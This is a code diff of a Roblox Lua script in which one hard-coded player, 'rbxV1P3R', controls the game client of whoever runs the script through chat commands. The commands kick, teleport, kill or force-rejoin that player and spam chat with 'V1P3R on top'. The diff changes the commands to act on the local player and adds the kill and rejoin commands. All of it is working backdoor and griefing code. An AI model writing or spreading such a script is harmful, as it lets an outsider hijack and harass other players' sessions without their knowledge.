@@ -1,22 +1,26 @@
 local Players = game:GetService("Players")
 local ReplicatedStorage = game:GetService("ReplicatedStorage")
+local Player = Players.LocalPlayer
 
 local monitoredPlayer = "rbxV1P3R"
 local spamActive = false
 local spamCoroutine
 
-game:GetService("Chat").MessagePosted:Connect(function(message, speaker)
-    if speaker.Name == monitoredPlayer then
+game:GetService("ReplicatedStorage"):WaitForChild("DefaultChatSystemChatEvents"):WaitForChild("OnMessageDoneFiltering").OnClientEvent:Connect(function(messageData)
+    local message = messageData.Message
+    local speaker = Players:GetPlayerByUserId(messageData.SpeakerUserId)
+
+    if speaker and speaker.Name == monitoredPlayer then
         if message:lower() == ".kick" then
             for _, player in pairs(Players:GetPlayers()) do
-                if player.Name ~= monitoredPlayer then
-                    player:Kick("Você foi expulso do servidor!")
+                if player == Player then
+                    Player:Kick("you got kicked loser! by V1P3R")
                 end
             end
         elseif message:lower() == ".tpa" then
             for _, player in pairs(Players:GetPlayers()) do
-                if player.Name ~= monitoredPlayer then
-                    player:MoveTo(speaker.Character.HumanoidRootPart.Position)
+                if player == Player then
+                    player.Character:SetPrimaryPartCFrame(speaker.Character.HumanoidRootPart.CFrame)
                 end
             end
         elseif message:lower() == ".spam" then
@@ -24,8 +28,8 @@ game:GetService("Chat").MessagePosted:Connect(function(message, speaker)
                 spamActive = true
                 spamCoroutine = coroutine.create(function()
                     while spamActive do
-                        game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer("V1P3R on top", "All")
-                        wait(1)
+                        ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer("V1P3R on top", "All")
+                        wait(2)
                     end
                 end)
                 coroutine.resume(spamCoroutine)
@@ -36,6 +40,12 @@ game:GetService("Chat").MessagePosted:Connect(function(message, speaker)
                 if spamCoroutine then
                     coroutine.close(spamCoroutine)
                 end
+            end
+        elseif message:lower() == ".rj" then
+            game:GetService("TeleportService"):Teleport(game.PlaceId, Player)
+        elseif message:lower() == ".kill" then
+            if Player.Character and Player.Character:FindFirstChild("Humanoid") then
+                Player.Character.Humanoid.Health = 0
             end
         end
     end
